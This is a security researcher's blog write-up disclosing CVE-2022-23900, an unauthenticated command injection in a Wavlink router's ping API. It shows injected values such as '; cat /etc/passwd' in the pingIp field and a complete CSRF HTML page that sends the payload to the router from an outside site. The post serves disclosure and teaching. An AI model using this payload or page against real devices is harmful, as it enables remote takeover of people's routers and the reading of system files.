---
title: Wavlink Command Injection - CVE-2022-23900 
author: stigward 
date: 2022-04-06 11:33:00 +0800
categories: [Vuln Research, IoT]
tags: [firmware, research, iot]
math: true
mermaid: true
---

# Wavlink Command Injection (CVE-2022–23900)

## TL/DR:

The  [Wavlink WL-WN531P3 router](https://www.amazon.com/Wireless-Touchlink-Beamforming-High-Gain-Connections/dp/B07WNV36B2)  exposes an API endpoint susceptible to command injection. This API endpoint is reachable without an authentication header, meaning the vulnerability can be exploited by an unauthenticated attacker. Furthermore, the router has no CSRF protection, thus RCE can be achieved without connecting to the local network.

## Vulnerability Description and Discovery:

The router hosts an API that is used to accept requests made from within the Admin portal. One thing a user can do from within this portal is send a  `ping`  command. An example has been included below:

![](https://miro.medium.com/max/1400/1*r2YxDLi4t-Db4XZQ8z3Pyg.png)

Because  `ping`  is a well-known bash command, we may immediately begin to theorize about the possibility of command injection.

### Command Injection Explanation:

For those unfamiliar with command injection, here is a quick rundown:

Let’s take the above  `ping`  functionality and walk through what could be happening between the web portal and the router.

1.  You as the user input the IP you wish to ping.
2.  The Admin portal sends a request to the router with the IP you specified.
3.  The router’s API endpoint handles the request with something like the following (yes this example has a BOF, it’s strictly an example):

char command[50];  
strcpy(command, "ping ")  
strcat(command, user_specified_ip)  
system(command)

In the above code, we first add “ping “ to the  `command`  buffer. Then we add what is stored in  `user_specified_ip`  to our buffer, imagining this variable is storing the IP we specified in the Admin portal. Finally, we run  `system(command)`  which will execute our shell command (`ping <ip>`) on the underlying host operating system.

### Abusing the  `system`  command:

You can run two shell commands in one line if you delaminate them with a  `;`  . So if you open a command prompt and run  `whoami; touch test.txt`  , the command will first output the result  `whoami`  and then it will create the file  `test.txt`. With this knowledge, we can exploit the  `ping`  example from above.

1.  Instead of inputting an IP in the admin panel, we input  `; whoami`.
2.  Now the command that gets run on the underlying OS is  `ping ; whoami`.
3.  The ping command fails as no argument is provided to it, and  `whoami`  subsequently executes, demonstrating an ability to run arbitrary commands on the box.

## Exploitation:

So, spoiler alert but the explanation above is pretty much verbatim what is happening on the router. We can demonstrate this by providing the following input:

![](https://miro.medium.com/proxy/1*hFDF_mkt0cCcd37fAGjnnQ.png)

We can also prove that the filesystem is not just read-only by creating a new file.

![](https://miro.medium.com/proxy/1*LTSwXi7yDe0JsFOxSDQW7A.png)

![](https://miro.medium.com/proxy/1*80gO-SzHr7KiC0qq-hk3Ww.png)

Things get slightly more interesting though. Looking at the screenshot of a malicious request below, we note that the  `pingIp`  variable, which is sent in a POST to the  `/cgi-bin/adm.cgi`  endpoint, is what contains our payload. Here we are reading the contents of  `/etc/passwd`

![](https://miro.medium.com/proxy/1*FkzY1fRMKaikN7AmpbHMog.png)

Because the user is logged in to the Admin portal, our malicious request includes a session cookie in the header (line 13 in the above screenshot). However, if we remove that header, the request is still successful, demonstrating this vulnerability is exploitable by an unauthenticated attacker.

![](https://miro.medium.com/proxy/1*ZYKq-qBoVQAKMe75WzTqIQ.png)

### Chaining with a CSRF:

The last step to weaponizing this exploit is adding the malicious request to an attacker-controlled website. The idea is as follows:

1.  An attacker from anywhere in the world creates a website that sends a malicious request to  `192.168.10.1/cgi-bin/adm.cgi`.
2.  The attacker sends the site to someone with the vulnerable Wavlink router.
3.  The victim opens the site, and a malicious request is sent to the router on their local network.

We can use the following fake website to achieve this result:

_Note that I have our payload submitted on a button click, but we could have it take place on page load for less required user interaction._
```html
<html>  
    <body>  
        <h1>Totally Not Malicious Website</h1>  
        <form action="http://192.168.10.1/cgi-bin/adm.cgi" method="POST">  
            <input type="hidden" name="page" value="ping_test" />  
            <input type="hidden" name="CCMD" value="4" />  
            <input type="hidden" name="pingIp" value="; cat /etc/passwd" />  
            <input type="submit" value="DONT CLICK" />  
        </form>  
    </body>  
</html>
```

And with that, an unauthenticated RCE from outside the local network can be achieved on any Wavlink WL-WN531P3 router.

![](https://miro.medium.com/proxy/1*CAF3uI-pod2D8rTRwnzK5g.png)

![](https://miro.medium.com/proxy/1*QpMHjRWuKUn6k3QJv_hXqg.png)

## Closing Thoughts:

This is a meme of an issue, but it is my first official CVE so I’ll take it. It does emphasize that IoT devices still struggle with low-hanging vulnerabilities, so if you are looking for a way to get started in security research, this is a good area to get your hands dirty.

If you enjoyed this write-up, feel free to follow me on Twitter  [@_stigward_](https://twitter.com/_stigward), where I tweet things about security, programming, and current projects. Currently, I am working on some content related to IoT hacking and smart contract auditing
